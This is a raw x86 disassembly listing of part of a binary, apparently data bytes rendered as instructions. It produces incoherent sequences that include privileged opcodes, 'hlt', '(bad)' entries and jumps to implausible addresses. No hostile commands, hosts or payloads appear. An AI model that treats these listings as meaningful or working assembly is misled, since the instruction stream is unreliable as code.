  406f67:	05 81 02 1c 0f       	add    $0xf1c0281,%eax
  406f6c:	0d 05 a9 02 65       	or     $0x6502a905,%eax
  406f71:	0f 47 02             	cmova  (%edx),%eax
  406f74:	b1 02                	mov    $0x2,%cl
  406f76:	ba 0f 47 02 c1       	mov    $0xc102470f,%edx
  406f7b:	01 7a 26             	add    %edi,0x26(%edx)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 f8                	add    %al,%bh
  406f83:	1e                   	push   %ds
  406f84:	13 05 81 02 cb 17    	adc    0x17cb0281,%eax
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 13 1e 0e    	add    %cl,0xe1e1302(%ecx)
  406f91:	00 89 02 72 0f 6b    	add    %cl,0x6b0f7202(%ecx)
  406f97:	01 b1 02 5c 0f 47    	add    %esi,0x470f5c02(%ecx)
  406f9d:	02 a1 02 5f 19 c7    	add    -0x38e6a0fe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 fc                	add    %edi,%esp
  406fa7:	20 1a                	and    %bl,(%edx)
  406fa9:	05 89 02 a5 20       	add    $0x20a50289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 39                	add    (%ecx),%bh
  406fb3:	0f 20 05             	mov    %cr0,%ebp
  406fb6:	89 02                	mov    %eax,(%edx)
  406fb8:	d2 24 4b             	shlb   %cl,(%ebx,%ecx,2)
  406fbb:	02 81 02 fb 22 27    	add    0x2722fb02(%ecx),%al
  406fc1:	05 c1 02 76 1d       	add    $0x1d7602c1,%eax
  406fc6:	30 05 c9 02 a4 10    	xor    %al,0x10a402c9
  406fcc:	c7 00 91 02 ce 25    	movl   $0x25ce0291,(%eax)
  406fd2:	35 05 c1 01 fc       	xor    $0xfc01c105,%eax
  406fd7:	20 3f                	and    %bh,(%edi)
  406fd9:	05 91 02 b9 12       	add    $0x12b90291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 c0 20       	add    $0x20c002d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	de 10                	ficoms (%eax)
  406fea:	3e 01 e1             	ds add %esp,%ecx
  406fed:	02 13                	add    (%ebx),%dl
  406fef:	1e                   	push   %ds
  406ff0:	4c                   	dec    %esp
  406ff1:	05 d9 02 57 1f       	add    $0x1f5702d9,%eax
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 7f 0f c3       	mov    0xc30f7f02,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 fc                	add    %edi,%esp
  407001:	20 01                	and    %al,(%ecx)
  407003:	05 99 02 13 1e       	add    $0x1e130299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 0d 10 6b 01 a1    	add    0xa1016b10,%cl
  407011:	02 73 15             	add    0x15(%ebx),%dh
  407014:	c3                   	ret
  407015:	00 a1 02 8f 0f c7    	add    %ah,-0x38f070fe(%ecx)
  40701b:	00 89 02 ec 14 4b    	add    %cl,0x4b14ec02(%ecx)
  407021:	02 89 02 7d 12 4b    	add    0x4b127d02(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	16                   	push   %ss
  40702b:	23 3e                	and    (%esi),%edi
  40702d:	01 59 01             	add    %ebx,0x1(%ecx)
  407030:	51                   	push   %ecx
  407031:	26 c3                	es ret
  407033:	00 a1 02 dc 22 c7    	add    %ah,-0x38dd23fe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 13                	add    (%ebx),%dl
  40703d:	1e                   	push   %ds
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 fe                	add    %dh,%bh
  407043:	12 23                	adc    (%ebx),%ah
  407045:	02 01                	add    (%ecx),%al
  407047:	03 13                	add    (%ebx),%edx
  407049:	1e                   	push   %ds
  40704a:	0e                   	push   %cs
  40704b:	00 01                	add    %al,(%ecx)
  40704d:	03 ab 0f 47 02 c1    	add    -0x3efdb8f1(%ebx),%ebp
  407053:	01 ad 1d 47 02 c1    	add    %ebp,-0x3efdb8e3(%ebp)
  407059:	01 00                	add    %eax,(%eax)
  40705b:	20 42 02             	and    %al,0x2(%edx)
  40705e:	09 03                	or     %eax,(%ebx)
  407060:	13 1e                	adc    (%esi),%ebx
  407062:	6b 01 09             	imul   $0x9,(%ecx),%eax
  407065:	03 59 21             	add    0x21(%ecx),%ebx
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	fb                   	sti
  40706d:	1d 70 05 19 03       	sbb    $0x3190570,%eax
  407072:	7a 22                	jp     0x407096
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	5b                   	pop    %ebx
  407079:	18 7c 05 c1          	sbb    %bh,-0x3f(%ebp,%eax,1)
  40707d:	01 d5                	add    %edx,%ebp
  40707f:	21 47 02             	and    %eax,0x2(%edi)
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	51                   	push   %ecx
  407085:	23 bf 01 81 02 89    	and    -0x76fd7eff(%edi),%edi
  40708b:	0e                   	push   %cs
  40708c:	86 05 29 03 44 00    	xchg   %al,0x440329
  407092:	f4                   	hlt
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	c9                   	leave
  407097:	22 7b 00             	and    0x0(%ebx),%bh
  40709a:	59                   	pop    %ecx
  40709b:	01 c7                	add    %eax,%edi
  40709d:	0f c3 00             	movnti %eax,(%eax)
  4070a0:	59                   	pop    %ecx
  4070a1:	01 9b 0f c3 00 59    	add    %ebx,0x5900c30f(%ebx)
  4070a7:	01 7b 19             	add    %edi,0x19(%ebx)
  4070aa:	93                   	xchg   %eax,%ebx
  4070ab:	05 c1 01 fc 20       	add    $0x20fc01c1,%eax
  4070b0:	99                   	cltd
  4070b1:	05 49 03 13 1e       	add    $0x1e130349,%eax
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	37                   	aaa
  4070bb:	03 cd                	add    %ebp,%ecx
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	43                   	inc    %ebx
  4070c1:	15 75 01 69 00       	adc    $0x690175,%eax
  4070c6:	13 1e                	adc    (%esi),%ebx
  4070c8:	0e                   	push   %cs
  4070c9:	00 21                	add    %ah,(%ecx)
  4070cb:	02 84 14 70 01 69 00 	add    0x690170(%esp,%edx,1),%al
  4070d2:	49                   	dec    %ecx
  4070d3:	0d aa 05 c1 01       	or     $0x1c105aa,%eax
  4070d8:	b1 14                	mov    $0x14,%cl
  4070da:	b0 05                	mov    $0x5,%al
  4070dc:	c1 01 6e             	roll   $0x6e,(%ecx)
  4070df:	1d 47 02 c1 01       	sbb    $0x1c10247,%eax
  4070e4:	b8 0d bd 05 59       	mov    $0x5905bd0d,%eax
  4070e9:	01 64 18 1d          	add    %esp,0x1d(%eax,%ebx,1)
  4070ed:	00 61 03             	add    %ah,0x3(%ecx)
  4070f0:	84 14 47             	test   %dl,(%edi,%eax,2)
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	60                   	pusha
  4070f7:	15 c3 00 b1 02       	adc    $0x2b100c3,%eax
  4070fc:	eb 0f                	jmp    0x40710d
  4070fe:	c3                   	ret
  4070ff:	05 59 03 fd 0f       	add    $0xffd0359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 84 14       	add    $0x14840359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	86 22                	xchg   %ah,(%edx)
  407110:	c9                   	leave
  407111:	05 79 03 13 1e       	add    $0x1e130379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 00 0f       	add    $0xf000379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 83 10       	add    $0x108300c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 83 10 0e 00 09    	add    %al,0x9000e10(%ebx)
  40712b:	03 13                	add    (%ebx),%edx
  40712d:	1e                   	push   %ds
  40712e:	36 02 0c 00          	add    %ss:(%eax,%eax,1),%cl
  407132:	13 1e                	adc    (%esi),%ebx
  407134:	0e                   	push   %cs
  407135:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407138:	b1 0b                	mov    $0xb,%cl
  40713a:	f5                   	cmc
  40713b:	05 0c 00 bf 22       	add    $0x22bf000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	8f                   	(bad)
  407145:	25 fb 05 c1 01       	and    $0x1c105fb,%eax
  40714a:	5a                   	pop    %edx
  40714b:	19 01                	sbb    %eax,(%ecx)
  40714d:	06                   	push   %es
  40714e:	51                   	push   %ecx
  40714f:	00 3b                	add    %bh,(%ebx)
  407151:	20 11                	and    %dl,(%ecx)
  407153:	06                   	push   %es
  407154:	51                   	push   %ecx
  407155:	00 98 01 17 06 59    	add    %bl,0x59061701(%eax)
  40715b:	00 0e                	add    %cl,(%esi)
  40715d:	0c 17                	or     $0x17,%al
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	6e                   	outsb  %ds:(%esi),(%dx)
  407163:	26 1d 06 69 00 13    	es sbb $0x13006906,%eax
  407169:	1e                   	push   %ds
  40716a:	01 03                	add    %eax,(%ebx)
  40716c:	61                   	popa
  40716d:	00 13                	add    %dl,(%ebx)
  40716f:	1e                   	push   %ds
  407170:	2d 06 91 03 83       	sub    $0x83039106,%eax
  407175:	10 0e                	adc    %cl,(%esi)
  407177:	00 99 03 13 1e 56    	add    %bl,0x561e1303(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 05 14 35 06 81    	add    0x81063514,%eax
  407185:	02 fe                	add    %dh,%bh
  407187:	0d 0a 00 91 02       	or     $0x291000a,%eax
  40718c:	c1 25 35 05 91 02 b9 	shll   $0xb9,0x2910535
  407193:	12 43 06             	adc    0x6(%ebx),%al
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	55                   	push   %ebp
  407199:	0e                   	push   %cs
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 c1 25 54    	add    0x5425c102(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 b0 12 7c 05 91    	add    -0x6efa83ee(%eax),%dh
  4071a9:	02 a4 12 6b 01 91 02 	add    0x291016b(%edx,%edx,1),%ah
  4071b0:	ce                   	into
  4071b1:	25 5e 06 91 02       	and    $0x291065e,%eax
  4071b6:	44                   	inc    %esp
  4071b7:	0e                   	push   %cs
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 b1 0b f5 05 b9    	add    %dh,-0x46fa0af5(%ecx)
  4071c1:	03 1f                	add    (%edi),%ebx
  4071c3:	23 7c 06 1c          	and    0x1c(%esi,%eax,1),%edi
  4071c7:	00 fb                	add    %bh,%bl
  4071c9:	1d 92 06 24 00       	sbb    $0x240692,%eax
  4071ce:	7a 22                	jp     0x4071f2
  4071d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071d1:	06                   	push   %es
  4071d2:	1c 00                	sbb    $0x0,%al
  4071d4:	e9 12 a9 06 24       	jmp    0x24471aeb
  4071d9:	00 51 23             	add    %dl,0x23(%ecx)
  4071dc:	bf 01 c9 03 48       	mov    $0x4803c901,%edi
  4071e1:	19 b3 06 c9 03 9d    	sbb    %esi,-0x62fc36fa(%ebx)
  4071e7:	0b b9 06 d1 03 4a    	or     0x4a03d106(%ecx),%edi
  4071ed:	10 c1                	adc    %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	c0 0d c8 06 d9 03 c9 	rorb   $0xc9,0x3d906c8
  4071f9:	0e                   	push   %cs
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 bf 10 d8 06 01    	add    0x106d810(%edi),%edi
  407203:	04 6f                	add    $0x6f,%al
  407205:	1c e2                	sbb    $0xe2,%al
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	bf 10 17 07 2c       	mov    $0x2c071710,%edi
  40720f:	00 74 21 23          	add    %dh,0x23(%ecx,%eiz,1)
  407213:	07                   	pop    %es
  407214:	34 00                	xor    $0x0,%al
  407216:	61                   	popa
  407217:	0e                   	push   %cs
  407218:	3b 07                	cmp    (%edi),%eax
  40721a:	1c 00                	sbb    $0x0,%al
  40721c:	13 1e                	adc    (%esi),%ebx
  40721e:	0e                   	push   %cs
  40721f:	00 c1                	add    %al,%cl
  407221:	01 ac 26 84 00 21 04 	add    %ebp,0x4210084(%esi,%eiz,1)
  407228:	13 1e                	adc    (%esi),%ebx
  40722a:	6b 01 19             	imul   $0x19,(%ecx),%eax
  40722d:	04 13                	add    $0x13,%al
  40722f:	1e                   	push   %ds
  407230:	59                   	pop    %ecx
  407231:	07                   	pop    %es
  407232:	29 04 64             	sub    %eax,(%esp,%eiz,2)
  407235:	1f                   	pop    %ds
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 66 14             	add    %esp,0x14(%esi)
  40723c:	93                   	xchg   %eax,%ebx
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	13 1e                	adc    (%esi),%ebx
  407242:	6b 01 59             	imul   $0x59,(%ecx),%eax
  407245:	02 13                	add    (%ebx),%dl
  407247:	1e                   	push   %ds
  407248:	0e                   	push   %cs
  407249:	00 31                	add    %dh,(%ecx)
  40724b:	04 13                	add    $0x13,%al
  40724d:	1e                   	push   %ds
  40724e:	0e                   	push   %cs
  40724f:	00 51 04             	add    %dl,0x4(%ecx)
  407252:	53                   	push   %ebx
  407253:	13 01                	adc    (%ecx),%eax
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	f0 12 01             	lock adc (%ecx),%al
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	e0 0d                	loopne 0x40726d
  407260:	7a 07                	jp     0x407269
  407262:	51                   	push   %ecx
  407263:	04 f9                	add    $0xf9,%al
  407265:	13 81 07 51 04 b9    	adc    -0x46fbaef9(%ecx),%eax
  40726b:	25 2b 02 51 04       	and    $0x451022b,%eax
  407270:	e1 07                	loope  0x407279
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	38 1e                	cmp    %bl,(%esi)
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 13             	cmp    %eax,(%ebx,%edx,1)
  40727d:	1e                   	push   %ds
  40727e:	8e 07                	mov    (%edi),%es
  407280:	51                   	push   %ecx
  407281:	04 c3                	add    $0xc3,%al
  407283:	07                   	pop    %es
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 d6             	cmp    %eax,(%esi,%edx,8)
  407289:	16                   	push   %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	13 1e                	adc    (%esi),%ebx
  407290:	2b 02                	sub    (%edx),%eax
  407292:	59                   	pop    %ecx
  407293:	02 8f 25 31 02 51    	add    0x51023125(%edi),%cl
  407299:	03 43 15             	add    0x15(%ebx),%eax
  40729c:	9a 07 79 04 13 1e 6b 	lcall  $0x6b1e,$0x13047907
  4072a3:	01 51 04             	add    %edx,0x4(%ecx)
  4072a6:	ca 07 2b             	lret   $0x2b07
  4072a9:	02 51 04             	add    0x4(%ecx),%dl
  4072ac:	28 1e                	sub    %bl,(%esi)
  4072ae:	88 07                	mov    %al,(%edi)
  4072b0:	c1 00 7f             	roll   $0x7f,(%eax)
  4072b3:	15 23 02 81 04       	adc    $0x4810223,%eax
  4072b8:	33 26                	xor    (%esi),%esp
  4072ba:	be 07 91 04 7f       	mov    $0x7f049107,%esi
  4072bf:	25 d0 07 a1 04       	and    $0x4a107d0,%eax
  4072c4:	13 1e                	adc    (%esi),%ebx
  4072c6:	0e                   	push   %cs
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 08                	add    %ecx,(%eax)
  4072cb:	21 f9                	and    %edi,%ecx
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 64 1f 99          	add    -0x67(%edi,%ebx,1),%ah
  4072d3:	01 49 02             	add    %ecx,0x2(%ecx)
  4072d6:	64 1f                	fs pop %ds
  4072d8:	ab                   	stos   %eax,%es:(%edi)
  4072d9:	01 a9 00 13 1e 0e    	add    %ebp,0xe1e1300(%ecx)
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	5b                   	pop    %ebx
  4072e3:	18 06                	sbb    %al,(%esi)
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	bf 22 f4 01 1c       	mov    $0x1c01f422,%edi
  4072ed:	00 54 1c 0e          	add    %dl,0xe(%esp,%ebx,1)
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 d3                	add    %edx,%ebx
  4072f5:	1f                   	pop    %ds
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 9a 12 28 08 49    	add    %bl,0x49082812(%edx)
  4072ff:	02 64 1f a5          	add    -0x5b(%edi,%ebx,1),%ah
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	65 00 32             	add    %dh,%gs:(%edx)
  407309:	08 c1                	or     %al,%cl
  40730b:	01 b4 18 47 02 a9 04 	add    %esi,0x4a90247(%eax,%ebx,1)
  407312:	9e                   	sahf
  407313:	10 37                	adc    %dh,(%edi)
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	65 00 3c 08          	add    %bh,%gs:(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 65 00             	add    %esp,0x0(%ebp)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	65 00 46 08          	add    %al,%gs:0x8(%esi)
  407328:	51                   	push   %ecx
  407329:	01 6e 00             	add    %ebp,0x0(%esi)
  40732c:	4d                   	dec    %ebp
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	9e                   	sahf
  407331:	10 52 08             	adc    %dl,0x8(%edx)
  407334:	51                   	push   %ecx
  407335:	01 6e 00             	add    %ebp,0x0(%esi)
  407338:	57                   	push   %edi
  407339:	08 51 01             	or     %dl,0x1(%ecx)
  40733c:	6e                   	outsb  %ds:(%esi),(%dx)
  40733d:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407341:	01 6e 00             	add    %ebp,0x0(%esi)
  407344:	61                   	popa
  407345:	08 51 01             	or     %dl,0x1(%ecx)
  407348:	80 0e 68             	orb    $0x68,(%esi)
  40734b:	08 b1 04 9e 10 6d    	or     %dh,0x6d109e04(%ecx)
  407351:	08 49 02             	or     %cl,0x2(%ecx)
  407354:	64 1f                	fs pop %ds
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 48 26             	add    0x26(%eax),%ecx
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	13 1e                	adc    (%esi),%ebx
  407362:	88 08                	mov    %cl,(%eax)
  407364:	c1 00 91             	roll   $0x91,(%eax)
  407367:	12 f4                	adc    %ah,%dh
  407369:	01 89 01 13 1e 6b    	add    %ecx,0x6b1e1301(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	76 00                	jbe    0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 e6                	add    %dh,%ah
  407379:	0e                   	push   %cs
  40737a:	bd 08 49 02 80       	mov    $0x80024908,%ebp
  40737f:	0e                   	push   %cs
  407380:	c4 08                	les    (%eax),%ecx
  407382:	49                   	dec    %ecx
  407383:	02 3b                	add    (%ebx),%bh
  407385:	00 cb                	add    %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	65 00 d2             	gs add %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	7f 00                	jg     0x407392
  407392:	d9 08                	(bad) (%eax)
  407394:	49                   	dec    %ecx
  407395:	02 6e 00             	add    0x0(%esi),%ch
  407398:	e0 08                	loopne 0x4073a2
  40739a:	49                   	dec    %ecx
  40739b:	02 64 1f 12          	add    0x12(%edi,%ebx,1),%ah
  40739f:	09 d1                	or     %edx,%ecx
  4073a1:	04 13                	add    $0x13,%al
  4073a3:	1e                   	push   %ds
  4073a4:	28 09                	sub    %cl,(%ecx)
  4073a6:	09 00                	or     %eax,(%eax)
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 4e 16             	add    %cl,0x16(%esi)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 c4                	add    %al,%ah
  4075c3:	00 a4 00 00 00 1d 09 	add    %ah,0x91d0000(%eax,%eax,1)
  4075ca:	a9 00 00 00 e6       	test   $0xe6000000,%eax
  4075cf:	05 ae 00 00 00       	add    $0xae,%eax
  4075d4:	d8 15 ae 00 00 00    	fcoms  0xae
  4075da:	5d                   	pop    %ebp
  4075db:	21 b2 00 00 00 4b    	and    %esi,0x4b000000(%edx)
  4075e1:	0a b7 00 00 00 2a    	or     0x2a000000(%edi),%dh
  4075e7:	06                   	push   %es
  4075e8:	bb 00 00 00 3d       	mov    $0x3d000000,%ebx
  4075ed:	26 b2 00             	es mov $0x0,%dl
  4075f0:	00 00                	add    %al,(%eax)
  4075f2:	1e                   	push   %ds
  4075f3:	07                   	pop    %es
